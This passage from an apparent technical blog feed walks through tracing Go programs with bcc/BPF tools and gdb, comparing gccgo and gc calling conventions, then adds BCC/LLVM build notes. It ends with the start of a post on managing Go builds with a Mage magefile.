class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libm.so<span class="number">.6</span> (<span class="number">0x00007f25f1901000</span>)</span><br><span class="line">$ objdump -tT /usr/lib/x86_64-linux-gnu/libgo.so<span class="number">.9</span> | grep fmt.Println</span><br><span class="line"><span class="number">0000000001221070</span> g     O .data.rel.ro   <span class="number">0000000000000008</span>              fmt.Println$descriptor</span><br><span class="line"><span class="number">0000000000978090</span> g     F .text  <span class="number">0000000000000075</span>              fmt.Println</span><br><span class="line"><span class="number">0000000001221070</span> g    DO .data.rel.ro   <span class="number">0000000000000008</span>  Base        fmt.Println$descriptor</span><br><span class="line"><span class="number">0000000000978090</span> g    DF .text  <span class="number">0000000000000075</span>  Base        fmt.Println</span><br></pre></td></tr></table></figure>
<p>这些内容看起来非常像一个编译过的 C 语言二进制程序，因此可以使用包括 bcc/BPF在内的许多现有的调试工具和追踪器观测。相对于测量即时编译的运行时要简单得多（例如 Java 和 Node.js）。到目前为止，这个例子唯一的麻烦事函数名称中可能包含非标准的字符，例如“.”。</p>
<p><strong>funccount</strong> also has options like -p to match a PID, and -i to emit output every interval. It currently can only handle up to 1000 probes at a time, so “fmt.*“ was ok, but matching everything in libgo:</p>
<p><strong>funccount</strong> 提供 -p 选项来匹配进程号（PID），-i 选项来控制输出频率。它目前能够同时处理 1000 个探测点，匹配 “fmt.*” 时运行正常，但是匹配 libgo 的所有函数就出现异常。诸如此类的问题在 bcc/BPF 中还有不少，我们需要寻找其它的方法来处理。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># funccount &#x27;go:*&#x27;</span></span><br><span class="line">maximum of 1000 probes allowed, attempted 21178</span><br></pre></td></tr></table></figure>
<h2 id="二、Go-gc-Function-Counting"><a href="#二、Go-gc-Function-Counting" class="headerlink" title="二、Go gc Function Counting"></a>二、Go gc Function Counting</h2><p>使用 Go 语言的 gc 编译器实现 fmt 函数调用计数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go build hello.go</span><br><span class="line">$ ./hello</span><br><span class="line">Hello, BPF!</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># funccount &#x27;/home/bgregg/hello:fmt.*&#x27;</span></span><br><span class="line">Tracing 78 <span class="built_in">functions</span> <span class="keyword">for</span> <span class="string">&quot;/home/bgregg/hello:fmt.*&quot;</span>... Hit Ctrl-C to end.</span><br><span class="line">^C</span><br><span class="line">FUNC                                    COUNT</span><br><span class="line">fmt.init.1                                  1</span><br><span class="line">fmt.(*fmt).padString                        1</span><br><span class="line">fmt.(*fmt).truncate                         1</span><br><span class="line">fmt.(*fmt).fmt_s                            1</span><br><span class="line">fmt.newPrinter                              1</span><br><span class="line">fmt.(*pp).free                              1</span><br><span class="line">fmt.Fprintln                                1</span><br><span class="line">fmt.Println                                 1</span><br><span class="line">fmt.(*pp).fmtString                         1</span><br><span class="line">fmt.(*pp).printArg                          1</span><br><span class="line">fmt.(*pp).doPrint                           1</span><br><span class="line">fmt.glob.func1                              1</span><br><span class="line">fmt.init                                    1</span><br><span class="line">Detaching...</span><br></pre></td></tr></table></figure>
<p>你依然能够追踪到 fmt.Println() ，这个二进制程序与 libgo 有所不同：包含该函数的是一个 2M 的静态库（而非动态库的 29K ）。另一个区别就是函数名称包含更多特殊字符，例如 “*“, “(“,等等，我怀疑如果不能修正处理的haul将影响其它调试器（例如 bcc 追踪器）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ file hello</span><br><span class="line">hello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped</span><br><span class="line">$ ls -lh hello</span><br><span class="line">-rwxr-xr-x 1 bgregg root 2.2M Jan 12 05:16 hello</span><br><span class="line">$ ldd hello</span><br><span class="line">    not a dynamic executable</span><br><span class="line">$ objdump -t hello | grep fmt.Println</span><br><span class="line">000000000045a680 g     F .text  00000000000000e0 fmt.Println</span><br></pre></td></tr></table></figure>
<h2 id="三、Per-event-invocations-of-a-function"><a href="#三、Per-event-invocations-of-a-function" class="headerlink" title="三、Per-event invocations of a function"></a>三、Per-event invocations of a function</h2><h4 id="3-1-gccgo-Function-Tracing"><a href="#3-1-gccgo-Function-Tracing" class="headerlink" title="3.1 gccgo Function Tracing"></a>3.1 gccgo Function Tracing</h4><p>现在我将尝试使用 <a href="https://www.linkedin.com/in/sashag/?ppe=1">Sasha Goldshtein</a> 的追踪工具，也是基于 <a href="https://github.com/iovisor/bcc">bcc</a>，用来查看每一个函数调用事件。我将回到 gccgo，使用一个非常简单的示例程序（ from the <a href="https://tour.golang.org/basics/4">go tour</a> ），functions.go:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(x <span class="keyword">int</span>, y <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(add(<span class="number">42</span>, <span class="number">13</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>追踪 add() 函数。所有参数都输出在右侧，trace 还有其他选项（帮助 -h ），例如输出时间戳和堆栈。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\<span class="comment"># trace &#x27;/home/bgregg/functions:main.add&#x27;</span></span><br><span class="line">PID    TID    COMM         FUNC             </span><br><span class="line">14424  14424  <span class="built_in">functions</span>    main.add  </span><br><span class="line"></span><br><span class="line"><span class="comment">#... and with both its arguments:</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># trace &#x27;/home/bgregg/functions:main.add &quot;%d %d&quot; arg1, arg2&#x27;</span></span><br><span class="line">PID    TID    COMM         FUNC             -</span><br><span class="line">14390  14390  <span class="built_in">functions</span>    main.add         42 13</span><br></pre></td></tr></table></figure>
<h4 id="3-2-Go-gc-Function-Tracing"><a href="#3-2-Go-gc-Function-Tracing" class="headerlink" title="3.2 Go gc Function Tracing"></a>3.2 Go gc Function Tracing</h4><p>同样的程序，如果使用 go build 就没有 main.add() ?  禁用代码嵌入（ Disabling inlining）即可。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">go</span> build functions.<span class="keyword">go</span></span><br><span class="line"></span><br><span class="line"># trace <span class="string">&#x27;/home/bgregg/functions:main.add &quot;%d %d&quot; arg1, arg2&#x27;</span></span><br><span class="line">could not determine address of symbol main.add</span><br><span class="line"></span><br><span class="line">$ objdump -t functions | grep main.add</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">go</span> build -gcflags <span class="string">&#x27;-l&#x27;</span> functions.<span class="keyword">go</span></span><br><span class="line">$ objdump -t functions | grep main.add</span><br><span class="line"><span class="number">0000000000401000</span> g     F .text  <span class="number">0000000000000020</span> main.add</span><br><span class="line"></span><br><span class="line"># trace <span class="string">&#x27;/home/bgregg/functions:main.add &quot;%d %d&quot; arg1, arg2&#x27;</span></span><br><span class="line">PID    TID    COMM         FUNC             -</span><br><span class="line"><span class="number">16061</span>  <span class="number">16061</span>  functions    main.add         <span class="number">536912504</span> <span class="number">16</span></span><br></pre></td></tr></table></figure>
<p><strong>That’s wrong.</strong> 参数应该是 42 和 13 而不是 536912504 和 16。<br>使用 gdb 查看结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gdb ./<span class="built_in">functions</span></span><br><span class="line">[...]</span><br><span class="line">warning: File <span class="string">&quot;/usr/share/go-1.6/src/runtime/runtime-gdb.py&quot;</span> auto-loading has been declined</span><br><span class="line"> by your <span class="string">&#x27;auto-load safe-path&#x27;</span> <span class="built_in">set</span> to <span class="string">&quot;<span class="variable">$debugdir</span>:<span class="variable">$datadir</span>/auto-load&quot;</span>.</span><br><span class="line">[...]</span><br><span class="line">(gdb) b main.add</span><br><span class="line">Breakpoint 1 at 0x401000: file /home/bgregg/functions.go, line 6.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/bgregg/<span class="built_in">functions</span></span><br><span class="line">[New LWP 16082]</span><br><span class="line">[New LWP 16083]</span><br><span class="line">[New LWP 16084]</span><br><span class="line">Thread 1 <span class="string">&quot;functions&quot;</span> hit Breakpoint 1, main.add (x=42, y=13, ~r2=4300314240) at</span><br><span class="line"> /home/bgregg/functions.go:6</span><br><span class="line">6           <span class="built_in">return</span> x + y</span><br><span class="line">(gdb) i r</span><br><span class="line">rax            0xc820000180 859530330496</span><br><span class="line">rbx            0x584ea0 5787296</span><br><span class="line">rcx            0xc820000180 859530330496</span><br><span class="line">rdx            0xc82005a048 859530698824</span><br><span class="line">rsi            0x10 16</span><br><span class="line">rdi            0xc82000a2a0 859530371744</span><br><span class="line">rbp            0x0  0x0</span><br><span class="line">rsp            0xc82003fed0 0xc82003fed0</span><br><span class="line">r8             0x41 65</span><br><span class="line">r9             0x41 65</span><br><span class="line">r10            0x4d8ba0 5082016</span><br><span class="line">r11            0x0  0</span><br><span class="line">r12            0x10 16</span><br><span class="line">r13            0x52a3c4 5415876</span><br><span class="line">r14            0xa  10</span><br><span class="line">r15            0x8  8</span><br><span class="line">rip            0x401000 0x401000</span><br><span class="line">eflags         0x206    [ PF IF ]</span><br><span class="line">cs             0xe033   57395</span><br><span class="line">ss             0xe02b   57387</span><br><span class="line">ds             0x0  0</span><br><span class="line">es             0x0  0</span><br><span class="line">fs             0x0  0</span><br><span class="line">gs             0x0  0</span><br></pre></td></tr></table></figure>
<p>启动信息中包含一个关于 runtime-gdb.py 的警告，它非常有用：如果需要进一步深入挖掘 Go 上下文，我希望能够修复并找出告警原因。即使没有该信息，gdb 依然可以输出参数变量的值是 “x=42, y=13”。我也将它们从寄存器导出与 x86_64 ABI（Application Binary Interface，应用程序二进制接口）对比，which is how bcc’s trace reads them. From the syscall(2) man page:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">       arch/ABI      arg1  arg2  arg3  arg4  arg5  arg6  arg7  Notes</span><br><span class="line">       ──────────────────────────────────────────────────────────────────</span><br><span class="line">[...]</span><br><span class="line">       x86_64        rdi   rsi   rdx   r10   r8    r9    -</span><br></pre></td></tr></table></figure>
<blockquote>
<p>The reason is that Go’s gc compiler is not following the standard AMD64 ABI function calling convention, which causes problems with this and other debuggers.</p>
</blockquote>
<p>42 和 13 没有出现在 rdi , rsi 或者其它任何一个寄存器。原因是 Go 的 gc 编译器不遵循标准的 AMD64 ABI 函数调用约定，其它调试器也会存在这个问题。这很烦人。我猜 Go 语言的返回值使用的是另外一种 ABI，因为它可以返回多个值，所以即使入口参数是标准的，我们仍然会遇到差异。我浏览了指南（Quick Guide to Go’s Assembler and the Plan 9 assembly manual），看起来函数在堆栈上传递。这些是我们的 42 和 13：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/<span class="number">3</span>dg $rsp</span><br><span class="line"><span class="number">0xc82003fed0</span>:   <span class="number">4198477</span> <span class="number">42</span></span><br><span class="line"><span class="number">0xc82003fee0</span>:   <span class="number">13</span></span><br></pre></td></tr></table></figure>
<p>BPF can dig these out too. As a proof of concept, I just hacked in a couple of new aliases, “go1” and “go2” for those entry arguments:</p>
<p>BPF 也可以挖掘这些信息。为了验证这一个概念，我为入口参数声明一对新的别名“go1”和“go2” 。希望您阅读本文的时候，我（或者其他人）已经将它加入到 bcc 追踪工具中，最好是 “goarg1”, “goarg2”, 等等。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># trace &#x27;/home/bgregg/functions:main.add &quot;%d %d&quot; go1, go2&#x27;</span></span><br><span class="line">PID    TID    COMM         FUNC             -</span><br><span class="line">17555  17555  <span class="built_in">functions</span>    main.add         42 13</span><br></pre></td></tr></table></figure>
<h2 id="四、Interface-Arguments"><a href="#四、Interface-Arguments" class="headerlink" title="四、Interface Arguments"></a>四、Interface Arguments</h2><p>你可以写一个自定义的 bcc/BPF 程序来挖掘，为了处理接口参数我们可以给 bcc 的跟踪程序添加多个别名。输入参数是接口的示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Println</span><span class="params">(a ...<span class="keyword">interface</span>&#123;&#125;)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Fprintln(os.Stdout, a...)</span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ gdb ./hello</span><br><span class="line">[...]</span><br><span class="line">(gdb) b fmt.Println</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x401c50</span></span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/bgregg/hello</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">[New Thread <span class="number">0x7ffff449c700</span> (LWP <span class="number">16836</span>)]</span><br><span class="line">[New Thread <span class="number">0x7ffff3098700</span> (LWP <span class="number">16837</span>)]</span><br><span class="line">[Switching to Thread <span class="number">0x7ffff3098700</span> (LWP <span class="number">16837</span>)]</span><br><span class="line">Thread <span class="number">3</span> <span class="string">&quot;hello&quot;</span> hit Breakpoint <span class="number">1</span>, fmt.Println (a=...) at ../../../src/libgo/<span class="keyword">go</span>/fmt/<span class="built_in">print</span>.<span class="keyword">go</span>:<span class="number">263</span></span><br><span class="line"><span class="number">263</span> ../../../src/libgo/<span class="keyword">go</span>/fmt/<span class="built_in">print</span>.<span class="keyword">go</span>: No such file or directory.</span><br><span class="line">(gdb) p a</span><br><span class="line">$<span class="number">1</span> = &#123;__values = <span class="number">0xc208000240</span>, __count = <span class="number">1</span>, __capacity = <span class="number">1</span>&#125;</span><br><span class="line">(gdb) p a.__values</span><br><span class="line">$<span class="number">18</span> = (<span class="keyword">struct</span> &#123;...&#125; *) <span class="number">0xc208000240</span></span><br><span class="line">(gdb) p a.__values[<span class="number">0</span>]</span><br><span class="line">$<span class="number">20</span> = &#123;__type_descriptor = <span class="number">0x4037c0</span> &lt;__go_tdn_string&gt;, __object = <span class="number">0xc208000210</span>&#125;</span><br><span class="line">(gdb) x/s *<span class="number">0xc208000210</span></span><br><span class="line"><span class="number">0x403483</span>:   <span class="string">&quot;Hello, BPF!&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="五、Function-Latency"><a href="#五、Function-Latency" class="headerlink" title="五、Function Latency"></a>五、Function Latency</h2><ul>
<li>示例：循环调用 fmt.Println() 函数的时延直方图（纳秒）</li>
</ul>
<p><strong>WARNING:</strong> Go 函数调用过程中，如果从一个进程（goroutine）切换到另外一个系统进程，<strong>funclatency</strong> 无法匹配入口-返回。这种场景需要一个新的工具 —— <strong>gofunclatency</strong> ，它基于 Go 内建的 GOID 替代系统的 TID 追踪时延，在某些情况下， <strong>uretprobes</strong> 修改 Go 程序可能出现崩溃的问题，因此在调试之前需要准备周全的计划。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># funclatency <span class="string">&#x27;go:fmt.Println&#x27;</span></span><br><span class="line">Tracing <span class="number">1</span> functions <span class="keyword">for</span> <span class="string">&quot;go:fmt.Println&quot;</span>... Hit Ctrl-C to end.</span><br><span class="line"></span><br><span class="line">Function = fmt.Println [<span class="number">3041</span>]</span><br><span class="line">     nsecs               : count     distribution</span><br><span class="line">         <span class="number">0</span> -&gt; <span class="number">1</span>          : <span class="number">0</span>        |                                        |</span><br><span class="line">         <span class="number">2</span> -&gt; <span class="number">3</span>          : <span class="number">0</span>        |                                        |</span><br><span class="line">         <span class="number">4</span> -&gt; <span class="number">7</span>          : <span class="number">0</span>        |                                        |</span><br><span class="line">         <span class="number">8</span> -&gt; <span class="number">15</span>         : <span class="number">0</span>        |                                        |</span><br><span class="line">        <span class="number">16</span> -&gt; <span class="number">31</span>         : <span class="number">0</span>        |                                        |</span><br><span class="line">        <span class="number">32</span> -&gt; <span class="number">63</span>         : <span class="number">0</span>        |                                        |</span><br><span class="line">        <span class="number">64</span> -&gt; <span class="number">127</span>        : <span class="number">0</span>        |                                        |</span><br><span class="line">       <span class="number">128</span> -&gt; <span class="number">255</span>        : <span class="number">0</span>        |                                        |</span><br><span class="line">       <span class="number">256</span> -&gt; <span class="number">511</span>        : <span class="number">0</span>        |                                        |</span><br><span class="line">       <span class="number">512</span> -&gt; <span class="number">1023</span>       : <span class="number">0</span>        |                                        |</span><br><span class="line">      <span class="number">1024</span> -&gt; <span class="number">2047</span>       : <span class="number">0</span>        |                                        |</span><br><span class="line">      <span class="number">2048</span> -&gt; <span class="number">4095</span>       : <span class="number">0</span>        |                                        |</span><br><span class="line">      <span class="number">4096</span> -&gt; <span class="number">8191</span>       : <span class="number">0</span>        |                                        |</span><br><span class="line">      <span class="number">8192</span> -&gt; <span class="number">16383</span>      : <span class="number">27</span>       |****************************************|</span><br><span class="line">     <span class="number">16384</span> -&gt; <span class="number">32767</span>      : <span class="number">3</span>        |****                                    |</span><br><span class="line">Detaching...</span><br></pre></td></tr></table></figure>
<h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>原作者总结很简洁，不再赘述。</p>
<blockquote>
<p>I took a quick look at Golang with dynamic tracing and Linux enhanced BPF, via bcc’s funccount and trace tools, with some successes and some challenges. Counting function calls works already. Tracing function arguments when compiled with gccgo also works, whereas Go’s gc compiler doesn’t follow the standard ABI calling convention, so the tools need to be updated to support this. As a proof of concept I modified the bcc trace tool to show it could be done, but that feature needs to be coded properly and integrated. Processing interface objects will also be a challenge, and multi-return values, again, areas where we can improve the tools to make this easier, as well as add macros to C for writing other custom Go observability tools as well.</p>
</blockquote>
<h2 id="七、Tips"><a href="#七、Tips" class="headerlink" title="七、Tips"></a>七、Tips</h2><h4 id="6-1-安装和编译-BCC"><a href="#6-1-安装和编译-BCC" class="headerlink" title="6.1 安装和编译 BCC"></a>6.1 安装和编译 BCC</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iovisor/bcc.git</span><br><span class="line">mkdir bcc/build; cd bcc/build</span><br><span class="line">cmake -DCMAKE_INSTALL_PREFIX=/usr \</span><br><span class="line">      -DLUAJIT_INCLUDE_DIR=`pkg-config --variable=includedir luajit` \ # for lua support</span><br><span class="line">      ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">cmake -DPYTHON_CMD=python3 .. # build python3 binding</span><br><span class="line">pushd src/python/</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">popd</span><br></pre></td></tr></table></figure>
<h4 id="6-2-构建-LLVM-和-Clang-开发工具库"><a href="#6-2-构建-LLVM-和-Clang-开发工具库" class="headerlink" title="6.2 构建 LLVM 和 Clang 开发工具库"></a>6.2 构建 LLVM 和 Clang 开发工具库</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install gcc</span><br><span class="line">yum install gcc-g++</span><br><span class="line"></span><br><span class="line">wget https://cmake.org/files/v3.9/cmake-3.9.0-rc4.tar.gz</span><br><span class="line">tar -xvf cmake-3.9.0-rc4.tar.gz</span><br><span class="line"><span class="built_in">cd</span> cmake-3.9.0</span><br><span class="line">./bootstrap  </span><br><span class="line">gmake</span><br><span class="line">gmake install</span><br><span class="line"><span class="built_in">export</span> CMAKE_ROOT=/usr/<span class="built_in">local</span>/share/cmake-3.9.0</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$CMAKE_ROOT</span></span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> http://llvm.org/git/llvm.git</span><br><span class="line"><span class="built_in">cd</span> llvm/tools;</span><br><span class="line">git <span class="built_in">clone</span> http://llvm.org/git/clang.git</span><br><span class="line"><span class="built_in">cd</span> ..; mkdir -p build/install; <span class="built_in">cd</span> build</span><br><span class="line">cmake -G \&quot;Unix Makefiles\&quot; -DLLVM_TARGETS_TO_BUILD=\&quot;BPF;X86\&quot; -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=<span class="variable">$PWD</span>/install ..</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PWD</span>/install/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
<h4 id="6-3-LLVM-与-Clang"><a href="#6-3-LLVM-与-Clang" class="headerlink" title="6.3 LLVM 与 Clang"></a>6.3 LLVM 与 Clang</h4><p>LLVM （Low Level Virtual Machine）是一种编译器基础设施，以C++写成。起源于2000年伊利诺伊大学厄巴纳-香槟分校维克拉姆·艾夫（Vikram Adve）与克里斯·拉特纳（Chris Lattner）的研究，他们想要为所有静态及动态语言创造出动态的编译技术。2005年，Apple直接雇用了克里斯·拉特纳及他的团队，为了苹果电脑开发应用程序，期间克里斯·拉特纳设计发明了 Swift 语言，LLVM 成为 Mac OS X 及 iOS 开发工具的一部分。LLVM 的范围早已经不局限于创建一个虚拟机，成为了众多编译工具及低级工具技术的统称，适用于LLVM下的所有项目，包含LLVM中介码（LLVM IR）、LLVM除错工具、LLVM C++标准库等。</p>
<p>目前 LLVM 已支持包括ActionScript、Ada、D语言、Fortran、GLSL、Haskell、Java字节码、Objective-C、Swift、Python、Ruby、Rust、Scala1以及C#等语言。</p>
<p>Clang 是LLVM编译器工具集的前端（front-end），目的是输出代码对应的抽象语法树（Abstract Syntax Tree, AST），并将代码编译成LLVM Bitcode。接着在后端（back-end）使用 LLVM 编译成平台相关的机器语言 。Clang支持C、C++、Objective C。它的目标是提供一个 GCC 的替代品。作者是克里斯·拉特纳（Chris Lattner），在苹果公司的赞助支持下进行开发。Clang项目包括Clang前端和Clang静态分析器等。</p>
<h4 id="6-4-ABI"><a href="#6-4-ABI" class="headerlink" title="6.4 ABI"></a>6.4 ABI</h4><p>应用二进制接口（Application Binary Interface， ABI）描述了应用程序和操作系统之间或其他应用程序的低级接口。ABI涵盖了各种细节，如：</p>
<ul>
<li>数据类型的大小、布局;</li>
<li>调用约定（控制着函数的参数如何传送以及如何接受返回值），例如，是所有的参数都通过栈传递，还是部分参数通过寄存器传递；哪个寄存器用于哪个函数参数；通过栈传递的第一个函数参数是最先push到栈上还是最后；</li>
<li><p>目标文件的二进制格式、程序库等等。</p>
</li>
<li><p>ABI vs API<br>应用程序接口 (API)定义了源代码和库之间的接口，因此同样的代码可以在支持这个API的任何系统中编译，然而ABI允许编译好的目标代码在使用兼容 ABI 的系统中无需改动就能运行。</p>
</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="动态追踪技术"><a href="#动态追踪技术" class="headerlink" title="动态追踪技术"></a>动态追踪技术</h4><ul>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（二）：User Space &amp; RAM</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory/">操作系统原理 | How Linux Works（三）：Memory</a></li>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.brendangregg.com/blog/2016-10-04/linux-bcc-mysqld-qslower.html">Linux MySQL Slow Query Tracing with bcc/BPF | Brendan Gregg’s Blog</a></li>
<li><a href="https://jvns.ca/blog/2017/06/28/notes-on-bpf---ebpf/">Notes on BPF &amp; eBPF | Julia Evans</a></li>
<li><a href="http://blogs.microsoft.co.il/sasha/2016/03/31/probing-the-jvm-with-bpfbcc/">Probing the JVM with BPF/BCC | Sasha</a></li>
<li><a href="https://www.slideshare.net/brendangregg/bpf-tracing-and-more">BPF: Tracing and more | Brendan Gregg SlideShare </a></li>
<li><a href="http://morsmachine.dk/http2-causalprof">Using Causal Profiling to Optimize the Go HTTP/2 Server</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>DTrace</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>DevOps 漫谈:全生命周期构建管理</title>
    <url>/2018/12/10/DevOps-Build/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>从源代码到产品</li>
<li>构建全生命周期管理：以 Golang 为例</li>
</ul>
<a id="more"></a>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h2 id="构建生命周期"><a href="#构建生命周期" class="headerlink" title="构建生命周期"></a>构建生命周期</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/build_process_go_v1.png" alt></p>
<ul>
<li>Pre Step: clean、variables(project,module,version,timestamp)</li>
<li>Build: compile、package</li>
<li>Install: install Deps</li>
<li>Test:</li>
<li>Release: Tag、build archive</li>
</ul>
<h2 id="基于-Mage-构建管理"><a href="#基于-Mage-构建管理" class="headerlink" title="基于 Mage 构建管理"></a>基于 Mage 构建管理</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ cd $project/test</span><br><span class="line">$ mage build</span><br><span class="line">$ mage -compile ./static-output</span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//magefile.go</span></span><br><span class="line"><span class="comment">// +build mage</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"errors"</span></span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"os"</span></span><br><span class="line">	<span class="string">"os/exec"</span></span><br><span class="line">	<span class="string">"time"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/magefile/mage/mg"</span> <span class="comment">// mg contains helpful utility functions, like Deps</span></span><br><span class="line">	<span class="string">"github.com/magefile/mage/sh"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// ProjectName</span></span><br><span class="line">	os.Setenv(<span class="string">"MATTEL_REPO"</span>, <span class="string">"go-chilopod"</span>)</span><br><span class="line">	os.Setenv(<span class="string">"TAG"</span>, <span class="string">"v0.1.2"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Default target to run when none is specified</span></span><br><span class="line"><span class="comment">// If not set, running mage will list available targets</span></span><br><span class="line"><span class="comment">// var Default = Build</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// A build step that requires additional params, or platform specific steps for example</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Build_v1</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	mg.Deps(InstallDeps)</span><br><span class="line">	fmt.Println(<span class="string">"Building..."</span>)</span><br><span class="line">	cmd := exec.Command(<span class="string">"go"</span>, <span class="string">"build"</span>, <span class="string">"-o"</span>, <span class="string">"MyApp"</span>, <span class="string">"."</span>)</span><br><span class="line">	<span class="keyword">return</span> cmd.Run()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Build</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	mg.Deps(Dep)</span><br><span class="line">	<span class="keyword">return</span> sh.RunV(<span class="string">"go"</span>, <span class="string">"build"</span>, <span class="string">"-o"</span>, <span class="string">"$MATTEL_REPO"</span>, <span class="string">"-ldflags="</span>+ldflags(), <span class="string">"github.com/riboseyim/$MATTEL_REPO"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Dep</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">"Installing Deps..."</span>)</span><br><span class="line">	cmd := exec.Command(<span class="string">"dep"</span>, <span class="string">"ensure"</span>)</span><br><span class="line">	<span class="keyword">return</span> cmd.Run()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// A custom install step if you need your bin someplace other than go/bin</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Install</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	